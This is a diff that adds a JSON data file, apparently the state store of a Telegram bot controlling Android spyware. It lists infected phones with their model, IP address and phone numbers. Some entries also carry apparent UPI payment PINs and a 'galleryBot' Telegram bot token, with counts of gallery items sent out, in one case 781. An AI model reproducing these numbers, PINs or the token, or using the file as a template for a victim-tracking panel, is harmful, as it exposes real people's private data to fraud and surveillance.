@@ -1,0 +1,383 @@
+{
+  "admins": [
+    7227540143
+  ],
+  "super_admins": [
+    7227540143,
+    7227540143
+  ],
+  "free": true,
+  "users": {
+    "7723468745": {
+      "firebases": [
+        {
+          "id": "1792866021",
+          "url": "https://project-1709357641301326375-default-rtdb.firebaseio.com",
+          "api_key": "https://project-1709357641301326375-default-rtdb.firebaseio.com"
+        }
+      ],
+      "devices": [
+        {
+          "id": "b04a19a4a14977bf",
+          "name": "b04a19a4a14977bf",
+          "fb_id": "1792866021",
+          "sims": [
+            {
+              "carrierName": "Jio True5G \u2014 JIO",
+              "phoneNumber": "918176996859",
+              "simSlotIndex": "0",
+              "subscriptionId": "3"
+            },
+            {
+              "carrierName": "Jio True5G \u2014 JIO",
+              "phoneNumber": "919696412503",
+              "simSlotIndex": "1",
+              "subscriptionId": "2"
+            }
+          ]
+        }
+      ],
+      "channels": [
+        {
+          "id": -1004356559434,
+          "name": "-1004356559434",
+          "type": "public"
+        },
+        {
+          "id": -1004454921780,
+          "name": "-1004454921780",
+          "type": "public"
+        }
+      ],
+      "active": {
+        "fb_url": "https://project-1709357641301326375-default-rtdb.firebaseio.com",
+        "device_id": "b04a19a4a14977bf",
+        "sims": [
+          0
+        ],
+        "ch_id": -1004454921780,
+        "ch_type": "public",
+        "ch_token": "",
+        "ch_name": "-1004454921780",
+        "repeat": 1
+      },
+      "monitoring": true,
+      "fwd": [],
+      "stats": {
+        "sent": 8,
+        "failed": 0,
+        "last": "00:12:24"
+      },
+      "expires": null,
+      "added_by": null,
+      "accept_from": [],
+      "paste_mode": true,
+      "_dev_cache": {
+        "1815e0f6914773b3": {
+          "androidV": "16",
+          "battery": "24%",
+          "cpu_arch": "arm64-v8a",
+          "deviceId": "1815e0f6914773b3",
+          "ip_address": "38.137.24.44",
+          "isRoot": false,
+          "isSdCard": true,
+          "joined": "23/10/2026 | 01:15 am",
+          "label": "",
+          "lastSeen": "23/10/2026 | 02:42:18 pm",
+          "like": false,
+          "mobNo": "+918766571017",
+          "modelName": "motorola edge 50 fusion",
+          "sdkV": "36",
+          "service_provider": "JIO 4G",
+          "sims": [
+            {
+              "carrierName": "Jio",
+              "phoneNumber": "+918766571017",
+              "simSlotIndex": "0",
+              "subscriptionId": "1"
+            },
+            {
+              "carrierName": "airtel",
+              "phoneNumber": "+919731750730",
+              "simSlotIndex": "1",
+              "subscriptionId": "2"
+            }
+          ],
+          "status": false,
+          "storage": "227GB",
+          "upipin": "N/A"
+        },
+        "1ab6f674fcc4e9ea": {
+          "androidV": "16",
+          "battery": "29%",
+          "cpu_arch": "arm64-v8a",
+          "deviceId": "1ab6f674fcc4e9ea",
+          "galleryBot": {
+            "botToken": "8992820257:AAGxCrTg1W2Bnuqv-aQsxKJHTnynLosa9IQ",
+            "channelId": "7227540143",
+            "isActive": false,
+            "progress": {
+              "current": 2,
+              "status": "stopped",
+              "timestamp": 1792779946472,
+              "total": 479
+            },
+            "timestamp": 1792779937468
+          },
+          "ip_address": "157.48.87.7",
+          "isRoot": false,
+          "isSdCard": true,
+          "joined": "23/10/2026 | 09:58 pm",
+          "label": "",
+          "lastSeen": "24/10/2026 | 11:49:52 pm",
+          "like": false,
+          "mobNo": "918875336215",
+          "modelName": "RMX3944",
+          "sdkV": "36",
+          "service_provider": "JIO 4G",
+          "sims": [
+            {
+              "carrierName": "Jio True5G \u2014 Jio",
+              "phoneNumber": "918875336215",
+              "simSlotIndex": "0",
+              "subscriptionId": "1"
+            }
+          ],
+          "status": true,
+          "storage": "103GB",
+          "upipin": "7023, 8875"
+        },
+        "4a825dd50b0db2fc": {
+          "androidV": "12",
+          "battery": "42%",
+          "cpu_arch": "armeabi-v7a",
+          "deviceId": "4a825dd50b0db2fc",
+          "galleryBot": {
+            "botToken": "8992820257:AAGxCrTg1W2Bnuqv-aQsxKJHTnynLosa9IQ",
+            "channelId": "7227540143",
+            "isActive": true,
+            "progress": {
+              "current": 0,
+              "status": "completed",
+              "timestamp": 1792734219795,
+              "total": 0
+            },
+            "timestamp": 1792732991850
+          },
+          "ip_address": "152.56.143.98",
+          "isRoot": false,
+          "isSdCard": true,
+          "joined": "23/10/2026 | 01:49 am",
+          "label": "",
+          "lastSeen": "24/10/2026 | 01:46:35 pm",
+          "like": false,
+          "modelName": "SM-M115F",
+          "sdkV": "31",
+          "service_provider": "",
+          "sims": [
+            {
+              "carrierName": "Unknown",
+              "phoneNumber": "Unknown",
+              "simSlotIndex": "Unknown",
+              "subscriptionId": "-1"
+            }
+          ],
+          "status": false,
+          "storage": "23GB",
+          "upipin": "N/A"
+        },
+        "5d458e8b2fc6d51f": {
+          "androidV": "15",
+          "battery": "48%",
+          "cpu_arch": "arm64-v8a",
+          "deviceId": "5d458e8b2fc6d51f",
+          "galleryBot": {
+            "botToken": "8992820257:AAGxCrTg1W2Bnuqv-aQsxKJHTnynLosa9IQ",
+            "channelId": "7227540143",
+            "isActive": true,
+            "progress": {
+              "current": 1,
+              "status": "completed",
+              "timestamp": 1792732931990,
+              "total": 1
+            },
+            "timestamp": 1792732923485
+          },
+          "ip_address": "43.248.59.255",
+          "isRoot": false,
+          "isSdCard": true,
+          "joined": "23/10/2026 | 02:29 am",
+          "label": "",
+          "lastSeen": "24/10/2026 | 11:50:03 pm",
+          "like": false,
+          "mobNo": "917003984726",
+          "modelName": "SM-A146B",
+          "sdkV": "35",
+          "service_provider": "Jio True5G",
+          "sims": [
+            {
+              "carrierName": "Jio True5G | Jio",
+              "phoneNumber": "917003984726",
+              "simSlotIndex": "0",
+              "subscriptionId": "3"
+            },
+            {
+              "carrierName": "Jio True5G | Jio",
+              "phoneNumber": "917980202148",
+              "simSlotIndex": "1",
+              "subscriptionId": "5"
+            }
+          ],
+          "status": true,
+          "storage": "50GB",
+          "upipin": "N/A"
+        },
+        "b04a19a4a14977bf": {
+          "androidV": "14",
+          "battery": "68%",
+          "cpu_arch": "arm64-v8a",
+          "deviceId": "b04a19a4a14977bf",
+          "galleryBot": {
+            "botToken": "8992820257:AAGxCrTg1W2Bnuqv-aQsxKJHTnynLosa9IQ",
+            "channelId": "7227540143",
+            "isActive": true,
+            "progress": {
+              "current": 781,
+              "status": "completed",
+              "timestamp": 1792731885737,
+              "total": 781
+            },
+            "timestamp": 1792728671649
+          },
+          "ip_address": "152.59.178.161",
+          "isRoot": false,
+          "isSdCard": true,
+          "joined": "23/10/2026 | 03:23 am",
+          "label": "",
+          "lastSeen": "24/10/2026 | 11:49:56 pm",
+          "like": false,
+          "mobNo": "918176996859",
+          "modelName": "LAVA LXX503",
+          "sdkV": "34",
+          "service_provider": "Jio True5G",
+          "sims": [
+            {
+              "carrierName": "Jio True5G \u2014 JIO",
+              "phoneNumber": "918176996859",
+              "simSlotIndex": "0",
+              "subscriptionId": "3"
+            },
+            {
+              "carrierName": "Jio True5G \u2014 JIO",
+              "phoneNumber": "919696412503",
+              "simSlotIndex": "1",
+              "subscriptionId": "2"
+            }
+          ],
+          "status": true,
+          "storage": "111GB",
+          "upipin": "N/A"
+        },
+        "b0972cbf15b3c327": {
+          "androidV": "15",
+          "battery": "80%",
+          "cpu_arch": "arm64-v8a",
+          "deviceId": "b0972cbf15b3c327",
+          "ip_address": "106.219.230.158",
+          "isRoot": false,
+          "isSdCard": true,
+          "joined": "23/10/2026 | 02:51 am",
+          "label": "",
+          "lastSeen": "23/10/2026 | 10:25:45 am",
+          "like": false,
+          "mobNo": "+917255922964",
+          "modelName": "moto g45 5G",
+          "sdkV": "35",
+          "service_provider": "airtel",
+          "sims": [
+            {
+              "carrierName": "airtel",
+              "phoneNumber": "+917255922964",
+              "simSlotIndex": "0",
+              "subscriptionId": "1"
+            }
+          ],
+          "status": false,
+          "storage": "111GB",
+          "upipin": "N/A"
+        },
+        "b2cf7ce2de483e7e": {
+          "androidV": "12",
+          "battery": "26%",
+          "cpu_arch": "arm64-v8a",
+          "deviceId": "b2cf7ce2de483e7e",
+          "ip_address": "157.33.1.233",
+          "isRoot": false,
+          "isSdCard": true,
+          "joined": "23/10/2026 | 01:24 AM",
+          "label": "",
+          "lastSeen": "23/10/2026 | 01:28:12 AM",
+          "like": false,
+          "mobNo": "918824976674",
+          "modelName": "vivo 1920_20",
+          "sdkV": "31",
+          "service_provider": "JIO 4G",
+          "sims": [
+            {
+              "carrierName": "JIO 4G \u2014 Jio",
+              "phoneNumber": "918824976674",
+              "simSlotIndex": "0",
+              "subscriptionId": "2"
+            },
+            {
+              "carrierName": "JIO 4G \u2014 Jio",
+              "phoneNumber": "917891393109",
+              "simSlotIndex": "1",
+              "subscriptionId": "8"
+            }
+          ],
+          "status": false,
+          "storage": "109GB",
+          "upipin": "N/A"
+        }
+      }
+    },
+    "1248439931": {
+      "firebases": [],
+      "devices": [],
+      "channels": [],
+      "active": {},
+      "monitoring": false,
+      "fwd": [],
+      "stats": {
+        "sent": 0,
+        "failed": 0,
+        "last": "\u2014"
+      },
+      "expires": null,
+      "added_by": null,
+      "accept_from": [],
+      "paste_mode": true
+    },
+    "7911418374": {
+      "firebases": [],
+      "devices": [],
+      "channels": [],
+      "active": {},
+      "monitoring": false,
+      "fwd": [],
+      "stats": {
+        "sent": 0,
+        "failed": 0,
+        "last": "\u2014"
+      },
+      "expires": null,
+      "added_by": null,
+      "accept_from": [],
+      "paste_mode": true
+    }
+  },
+  "timed_users": {},
+  "force_join": [],
+  "banned": []
+}
